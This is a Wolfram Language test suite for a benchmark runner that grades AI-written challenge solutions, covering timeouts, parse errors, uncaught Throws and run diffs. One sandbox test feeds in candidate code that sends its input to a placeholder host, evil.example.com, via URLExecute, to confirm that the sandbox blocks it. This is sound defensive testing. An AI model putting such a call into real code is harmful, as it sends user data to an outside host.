(* ::Package:: *)

(* Tests for RunBenchmark + the sandbox.  InProcess mode is used throughout
   so the suite runs fast; PerTestKernel/PooledKernels are exercised by the
   Integration.wlt suite. *)

Needs["JofreEspigulePons`WolframChallengesBenchmark`"];

(* Wolfram 15.0's VerificationTest silently drops ActualMessages, so
   we capture $MessageList ourselves. $MessageList is Protected. *)
ClearAll[captureMsgs, hasMessageQ];
SetAttributes[captureMsgs, HoldFirst];
captureMsgs[expr_] := Module[{v, msgs},
  Unprotect[$MessageList];
  Block[{$MessageList = {}}, v = expr; msgs = $MessageList];
  Protect[$MessageList];
  {v, msgs}];
SetAttributes[hasMessageQ, HoldRest];
hasMessageQ[msgs_List, msgNameExpr_] := MemberQ[msgs, HoldForm[msgNameExpr]];

$tmp = FileNameJoin[{$TemporaryDirectory,
  "wclb-tests-runner-" <> ToString[RandomInteger[10^9]]}];
If[! DirectoryQ[$tmp],
  CreateDirectory[$tmp, CreateIntermediateDirectories -> True]];

challenges = <|"Sum" -> <|"name" -> "Sum", "prompt" -> "addTwo"|>|>;
testBank   = <|
  "Sum" -> {<|"challengeName" -> "Sum",
              "input"    -> HoldComplete[addTwo[2, 3]],
              "expected" -> 5, "metadata" -> <||>|>,
            <|"challengeName" -> "Sum",
              "input"    -> HoldComplete[addTwo[10, 7]],
              "expected" -> 17, "metadata" -> <||>|>}
|>;


(* ---------- Happy path: 2/2 pass ---------- *)

VerificationTest[
  Module[{sol, run},
    sol = <|"Sum" -> <|"code" -> "addTwo[a_, b_] := a + b"|>|>;
    run = JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/happy",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    {run["meta", "summary", "passed"],
     run["meta", "summary", "total"],
     FileExistsQ @ FileNameJoin[{run["runDir"], "run.json"}],
     FileExistsQ @ FileNameJoin[{run["runDir"], "progress.jsonl"}],
     FileExistsQ @ FileNameJoin[{run["runDir"], "results.wxf"}]}
  ],
  {2, 2, True, True, True},
  TestID -> "RunBenchmark/happy-path-inprocess"
]


(* ---------- ParseError bucket: code that won't parse as WL ---------- *)

VerificationTest[
  Module[{sol, run, statuses},
    sol = <|"Sum" -> <|"code" -> "this is not [[[ valid wolfram"|>|>;
    run = JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/parse",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    statuses = Counts[#["status"] & /@ run["results"]];
    {run["meta", "summary", "passed"],
     Lookup[statuses, "ParseError", 0]}
  ],
  {0, 2},
  TestID -> "RunBenchmark/parse-error"
]


(* ---------- TimedOut bucket: infinite loop is stopped ---------- *)

(* Quiet wraps the whole call so that any system-side messages fired by
   the kernel while aborting a tight CPU-bound While[True, True] loop
   (e.g. Abort propagation) don't leak into VerificationTest's
   ActualMessages. The test's real assertion is purely about status. *)
VerificationTest[
  Module[{sol, run, statuses},
    sol = <|"Sum" -> <|"code" -> "addTwo[a_, b_] := While[True, True]"|>|>;
    run = Quiet @ JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/timeout",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp,
      "TimeConstraint" -> 1];
    statuses = Counts[#["status"] & /@ run["results"]];
    Lookup[statuses, "TimedOut", 0] >= 1
  ],
  True,
  TestID -> "RunBenchmark/timeout-is-enforced"
]


(* ---------- NoSolution bucket: missing candidate ---------- *)

VerificationTest[
  Module[{sol, run, statuses},
    sol = <||>;   (* no solution supplied at all *)
    run = JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/nosol",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    statuses = Counts[#["status"] & /@ run["results"]];
    {run["meta", "summary", "passed"],
     Lookup[statuses, "NoSolution", 0]}
  ],
  {0, 2},
  TestID -> "RunBenchmark/no-solution"
]


(* ---------- Sandbox: candidate tries URLExecute and gets $Failed back ---------- *)

VerificationTest[
  Module[{c, tb, sol, run},
    c = <|"Exfil" -> <|"name" -> "Exfil", "prompt" -> "f"|>|>;
    tb = <|"Exfil" -> {<|"challengeName" -> "Exfil",
                         "input"    -> HoldComplete[f[1]],
                         "expected" -> 1, "metadata" -> <||>|>}|>;
    sol = <|"Exfil" -> <|"code" ->
      "f[x_] := URLExecute[\"https://evil.example.com/\" <> ToString[x]]"|>|>;
    run = JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      c, tb, sol,
      "Model" -> "t/sandbox",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp,
      "Sandbox" -> True, "TimeConstraint" -> 5];
    {run["meta", "summary", "passed"],
     First[run["results"]]["actualOutput"]}
  ],
  {0, $Failed},
  TestID -> "RunBenchmark/sandbox-blocks-urlexecute"
]


(* ---------- Uncaught Throw bucket: candidate escapes Catch ---------- *)
(*
  Regression test for a real production failure: gemini-2.5-flash's
  PairingCompatibleIntegers solution contained:
     Catch[Do[..., Throw[result]], "PairingFound"]
  The inner Throw is untagged, the outer Catch only accepts the tag
  "PairingFound", so the Throw bubbles out of the solution and -- pre-fix
  -- through the Runner's own Catch[expr, _, h] (which only matches
  TAGGED throws), killing the driver kernel with Throw::nocatch. The
  Runner now uses a nested Catch to trap both tagged-but-unmatched and
  untagged Throws, converting them into status="EvaluationError". *)

VerificationTest[
  Module[{sol, run, statuses},
    sol = <|"Sum" -> <|"code" -> "addTwo[a_, b_] := Throw[a + b]"|>|>;
    run = Quiet @ JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/untagged-throw",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    statuses = Counts[#["status"] & /@ run["results"]];
    {run["meta", "summary", "passed"],
     Lookup[statuses, "EvaluationError", 0]}
  ],
  {0, 2},
  TestID -> "RunBenchmark/untagged-throw-contained"
]

VerificationTest[
  Module[{sol, run, statuses},
    sol = <|"Sum" -> <|"code" ->
      "addTwo[a_, b_] := Catch[Throw[a + b], \"NoMatch\"]"|>|>;
    run = Quiet @ JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/mismatched-throw",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    statuses = Counts[#["status"] & /@ run["results"]];
    {run["meta", "summary", "passed"],
     Lookup[statuses, "EvaluationError", 0]}
  ],
  {0, 2},
  TestID -> "RunBenchmark/mismatched-tag-throw-contained"
]


(* ---------- Messages-but-no-abort: candidate runs to completion --- *)
(*
  Regression test for the "sandbox threw" misclassification observed in
  gemini-2.5-flash's PermutationIndex run (2026-04-22 17:11 UTC):
  PermutationIndex[5, 720] makes the candidate compute idx = Quotient[
  719, 24] = 29 and then call remaining[[30]] on a 5-element list. Wolfram
  fires Part::partw and Delete::partw repeatedly, then the candidate
  returns a malformed expression containing unevaluated Delete[Delete[...]
  fragments. The pre-fix runner classified the row as RunnerError ("sandbox
  threw") because a Check wrapper at the InProcess layer triggered on the
  candidate's messages. The fix (#54) was to drop that Check so candidate
  messages no longer poison the row \[LongDash] the test now correctly
  grades as Evaluated/passed=False with messageCount > 0.

  We simulate the same shape with `addTwo[a_,b_] := First[{}]`: First
  fires First::nofirst, returns First[{}] symbolically, and the candidate
  completes evaluation. Status must be "Evaluated" (not "RunnerError"),
  passed must be False, and messageCount must be \[GreaterEqual] 1.
*)

VerificationTest[
  Module[{sol, run, r},
    sol = <|"Sum" -> <|"code" -> "addTwo[a_, b_] := First[{}]"|>|>;
    run = Quiet @ JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol,
      "Model" -> "t/messages-no-abort",
      "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    r = First[run["results"]];
    {r["status"], r["passed"], r["messageCount"] >= 1}
  ],
  {"Evaluated", False, True},
  TestID -> "RunBenchmark/messages-do-not-classify-as-RunnerError"
]


(* ---------- Missing Model -> badmode error ---------- *)

VerificationTest[
  Module[{v, msgs},
    {v, msgs} = captureMsgs @
      JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
        challenges, testBank, <||>,
        "IsolationMode" -> "InProcess",
        "OutputDirectory" -> $tmp];
    {v, hasMessageQ[msgs,
      JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark::nomodel]}
  ],
  {$Failed, True},
  {JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark::nomodel},
  TestID -> "RunBenchmark/requires-model"
]


(* ---------- Bad isolation mode ---------- *)

VerificationTest[
  Module[{v, msgs},
    {v, msgs} = captureMsgs @
      JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
        challenges, testBank, <||>,
        "Model" -> "t/badmode",
        "IsolationMode" -> "BogusMode",
        "OutputDirectory" -> $tmp];
    {v, hasMessageQ[msgs,
      JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark::badmode]}
  ],
  {$Failed, True},
  {JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark::badmode},
  TestID -> "RunBenchmark/bad-isolation-mode"
]


(* ---------- DiffRuns: regressions + fixes correctly identified ---------- *)

VerificationTest[
  Module[{sol1, sol2, run1, run2, diff},
    sol1 = <|"Sum" -> <|"code" -> "addTwo[a_, b_] := a + b"|>|>;
    sol2 = <|"Sum" -> <|"code" -> "addTwo[a_, b_] := a * b"|>|>;
    run1 = JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol1,
      "Model" -> "t/d-good", "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    run2 = JofreEspigulePons`WolframChallengesBenchmark`RunBenchmark[
      challenges, testBank, sol2,
      "Model" -> "t/d-bad", "IsolationMode" -> "InProcess",
      "OutputDirectory" -> $tmp, "TimeConstraint" -> 10];
    diff = JofreEspigulePons`WolframChallengesBenchmark`DiffRuns[run1, run2];
    {diff["summary", "regressions"],
     diff["summary", "fixes"],
     Sort @ diff["regressions"]}
  ],
  {2, 0, {"Sum/1", "Sum/2"}},
  TestID -> "DiffRuns/catches-regressions"
]
